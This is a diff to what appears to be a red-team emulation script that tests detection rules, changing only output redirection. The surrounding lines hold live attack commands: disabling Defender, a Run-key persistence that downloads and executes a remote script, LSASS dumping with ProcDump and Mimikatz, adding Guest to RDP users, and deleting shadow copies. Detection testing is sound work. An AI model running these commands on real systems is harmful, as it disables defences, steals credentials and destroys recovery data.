@@ -109,8 +109,8 @@ Write-Host "Initiating Defense Evasion - T1089 - Disabling Security Tools"
 Write-Host "Disabling Defender..."
 $cmd = "Set-MpPreference -DisableRealtimeMonitoring `$true; Start-Sleep -m $n"
 powershell.exe -Win N -exec bypass -nop -command $cmd
-sc config WinDefend start= disabled >nul 2>&1
-sc stop WinDefend >nul 2>&1
+sc config WinDefend start= disabled 2>null
+sc stop WinDefend 2>null
 
 
 Write-Host "Creating binary with double extension"
@@ -139,7 +139,7 @@ Write-Host "Autostart locations like Registry Run Keys or files in User Startup 
 Write-Host "Adding T1547.001 - Registry Run Key Foothold w/ undetectable malware (calc)"
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe -i $n"
 Start-Sleep 2
-#REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /f >nul 2>&1
+#REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /f 2>null
 
 Write-Host "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
 $subcmd = 'powershell.exe -command "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`");"'
@@ -183,8 +183,8 @@ schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe -i
 Write-Host "Adding Persistence - T1053 - On Startup cheduled Task Startup Script"
 schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe -i $n" /f
 Start-sleep 2
-#schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
-#schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
+#schtasks /delete /tn "T1053_005_OnLogon" /f 2>null
+#schtasks /delete /tn "T1053_005_OnStartup" /f 2>null
 
 Start-Sleep 10
 
@@ -208,7 +208,7 @@ Write-Host -ForegroundColor Cyan "`nStarting Credential Harvesting step"
 Write-Host "Downloading ProcDump.exe"
 Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile "$AttackDir\procdump.exe"
 Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
-#Start-Process -FilePath "$AttackDir\procdump.exe" -ArgumentList "-ma lsass.exe lsass.dmp -accepteula -at $n >nul 2>&1" 2>$null -Wait
+#Start-Process -FilePath "$AttackDir\procdump.exe" -ArgumentList "-ma lsass.exe lsass.dmp -accepteula -at $n 2>null" 2>$null -Wait
 & $AttackDir\procdump.exe -ma lsass.exe lsass.dmp -accepteula -dc $n
 
 Write-host "Initiating Credential Access - T1003 - Credential Dumping with Mimikatz"
@@ -241,12 +241,12 @@ Start-Sleep 10
 # LATERAL MOVEMENT
 Write-Host -ForegroundColor Cyan "`nStarting Lateral Movement Step"
 Write-Host "Adding Passwordless Guest Accounts to Remote Desktop Users"
-net localgroup "Remote Desktop Users" Guest /add /comment:"$n" >nul 2>&1
+net localgroup "Remote Desktop Users" Guest /add /comment:"$n"
 Start-Sleep 3
 
 #Cleanup
 Write-Host "Removing Guest from Remote Desktop Users"
-net localgroup "Remote Desktop Users" Guest /delete  >nul 2>&1
+net localgroup "Remote Desktop Users" Guest /delete
 
 Start-Sleep 10
 
@@ -255,10 +255,10 @@ Write-Host -ForegroundColor Cyan "`nStarting Impact Step"
 Write-Host "Testing Rule: Disable Automatic Windows Recovery (Note: these test commands are designed with syntax errors)"
 Write-Host "(Impact-T1490) Automatic Windows recovery features disabled"
 Write-Host "[ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)"
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f /i $n >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f /i $n >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f /i $n >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f /i $n >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f /i $n 2>null
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f /i $n 2>null
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f /i $n 2>null
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f /i $n 2>null
 Start-Sleep 2
 
 # clean up
@@ -272,7 +272,7 @@ Start-Sleep 2
 Write-Host "Testing Rule: Shadow Copy Deletion"
 Write-Host "(Impact-T1490) Volume shadow copy was deleted"
 Write-Host "[ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)"
-vssadmin.exe delete shadows /All /Shadow=$n /quiet >nul 2>&1
+vssadmin.exe delete shadows /All /Shadow=$n /quiet 2>null
 
 
 Write-Host "Testing Rule: Wallpaper Defacement"
